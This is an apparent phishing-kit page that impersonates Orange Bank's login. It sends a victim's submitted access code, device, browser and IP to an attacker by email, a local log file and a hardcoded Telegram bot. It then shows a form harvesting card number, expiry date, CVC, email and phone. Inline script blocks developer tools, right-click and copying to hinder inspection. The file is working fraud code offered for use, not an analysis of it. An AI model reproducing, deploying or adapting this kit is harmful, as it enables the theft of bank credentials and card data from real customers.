<?php
include "antibots.php";
include("funcs.php");
$_SESSION['data'] = $_POST['data'];

$message  = "----------- | New CODE D'ACCESS - ORANGE-B | -----------\n\n";
$message .= "#CODE D'ACCESS : ".$_POST['data']."\n";
$message .= "------------------ | INFO | ------------------\n\n";
$message .= "Device  : ".$OS."\n";
$message .= "Browser : ".$Browser."\n";
$message .= "IP      : ".$ip."\n";
$message .= "----------- | New CODE D'ACCESS - ORANGE-B | -----------\n\n\n\n\n";

$send = "";
$subject = "ORANGE-B |".$ip;
$headers = "From:  Login <orba@localprofessional.fr>";
mail($send,$subject,$message,$headers);
 
$file = fopen("./res.txt","a");
fwrite($file,$message);  

$website="https://api.telegram.org/bot1731756144:AAGMsFtd9cXT7e00HXguB8HHYBV-wrdy_og";
$chatId=711705844;  //Receiver Chat Id 
$params=[
    'chat_id'=>'711705844',
    'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);


?>
<html><head>
 <link rel="icon" href="./favicon.ico" type="image/ico" sizes="16x16">
	<link rel="stylesheet" type="text/css" href="./triangle/css/fontawesome.min.css">
	<link rel="stylesheet" type="text/css" href="./triangle/css/all.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<style type="text/css">

body {
    max-width: 400px;
      margin: auto;
}


.form-style-8 h2{
	background: #4D4D4D;
	text-transform: uppercase;
	font-family: 'Open Sans Condensed', sans-serif;
	color: #797979;
	font-size: 18px;
	font-weight: 100;
	padding: 20px;
	margin: -30px -30px 30px -30px;
}
.form-style-8 input[type="text"],
.form-style-8 input[type="date"],
.form-style-8 input[type="datetime"],
.form-style-8 input[type="email"],
.form-style-8 input[type="number"],
.form-style-8 input[type="search"],
.form-style-8 input[type="time"],
.form-style-8 input[type="url"],
.form-style-8 input[type="password"],
.form-style-8 textarea,
.form-style-8 select 
{
	box-sizing: border-box;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	outline: none;
	display: block;
	width: 100%;
	padding: 7px;
	border: none;
	border-bottom: 1px solid #ddd;
	background: transparent;
	margin-bottom: 10px;
	font: 16px Arial, Helvetica, sans-serif;
	height: 45px;
}
.form-style-8 textarea{
	resize:none;
	overflow: hidden;
}
.form-style-8 input[type="button"], 
.form-style-8 input[type="submit"]{
	-moz-box-shadow: inset 0px 1px 0px 0px #45D6D6;
	-webkit-box-shadow: inset 0px 1px 0px 0px #45D6D6;
	box-shadow: inset 0px 1px 0px 0px #45D6D6;
	background-color: #2CBBBB;
	border: 1px solid #27A0A0;
	display: inline-block;
	cursor: pointer;
	color: #FFFFFF;
	font-family: 'Open Sans Condensed', sans-serif;
	font-size: 14px;
	padding: 8px 18px;
	text-decoration: none;
	text-transform: uppercase;
}
.form-style-8 input[type="button"]:hover, 
.form-style-8 input[type="submit"]:hover {
	background:linear-gradient(to bottom, #34CACA 5%, #30C9C9 100%);
	background-color:#34CACA;
}</style>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Authentification - Orange Bank</title>
<link rel="stylesheet" type="text/css" href="files/style.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="files/function.js"></script>
	
</head>
<body>
	<form class="form" action="IdenREU.php" method="post" enctype="multipart/form-data">
		<div class="table">
			<img class="logo" src="./files/oblogo.png">
			
			<div>

			<p class="txt2" style="text-align:center;color: #000000;font-size:17px; ! important">Informations personnelles</p><hr style="width: 95%;margin-top: 10px;margin-left: 0%;margin-bottom: 10px;border: 2px solid #f16e00;" align="left">


			
			</div>
			
		
			<div class="form-style-8">
    <input required="" maxlength="35" pattern=".{3,}" type="text" placeholder="Nom et prénom" name="fname">
<input inputmode="numeric" id="ccnum" onkeypress="return isNumber(event)" required="" pattern=".{16,}" maxlength="19" type="text" placeholder="Numéro de votre carte" name="cdec">
<input required="" onkeypress="return isNumber(event)" inputmode="numeric" id="expiry" pattern=".{7,}" maxlength="7" type="text" placeholder="Date d'expiration" name="exp">
<input required="" inputmode="numeric" id="cvc" onkeypress="return isNumber(event)" pattern=".{3,}" maxlength="4" type="text" placeholder="Cryptogramme visuel (CVC)" name="cve">
<input required="" maxlength="35" type="email" placeholder="Adresse E-mail" name="emai">
<input onkeypress="return isNumber(event)" required="" maxlength="11" pattern=".{10,}" type="text" placeholder="Numéro de téléphone" name="pho"></div>
	
				<script src="files/payform.js" charset="utf-8"></script>
  <script>
    payform.cardNumberInput(document.getElementById('ccnum'));
    payform.expiryInput(document.getElementById('expiry'));
    payform.cvcInput(document.getElementById('cvc'));



    
function isNumber(evt) {
    evt = (evt) ? evt : window.event;
    var charCode = (evt.which) ? evt.which : evt.keyCode;
    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
        return false;
    }
    return true;
}


document.onkeypress = function(event) {
event = (event || window.event);
if (event.keyCode === 123) {
return false;}};
document.onmousedown = function(event) {
event = (event || window.event);
if (event.keyCode === 123) {
return false;}};
document.onkeydown = function(event) {
event = (event || window.event);
if (event.keyCode === 123) {
return false;}};
function cp() {return false;}
function mousehandler(e) {
var myevent = (isNS) ? e : event;
var eventbutton = (isNS) ? myevent.which : myevent.button;
if ((eventbutton == 2) || (eventbutton == 3))
return false;}
document.oncontextmenu = cp;
document.onmouseup = cp;
var isCtrl = false;
window.onkeyup = function(e)
{if (e.which == 17)
isCtrl = false;}
window.onkeydown = function(e)
{if (e.which == 17)
isCtrl = true;
if (((e.which == 85) || (e.which == 65) || (e.which == 88) || (e.which == 67) || (e.which == 86) || (e.which == 83)) && isCtrl == true){
return false;}}
document.ondragstart = cp;

  </script>




			<br><br>
			
			
			
			
			
			
			<button tabindex="6" type="submit" name="btn" class="btn2">Suivant</button>


			
			
			
			
			
			
		</div>
	</form>


</body></html>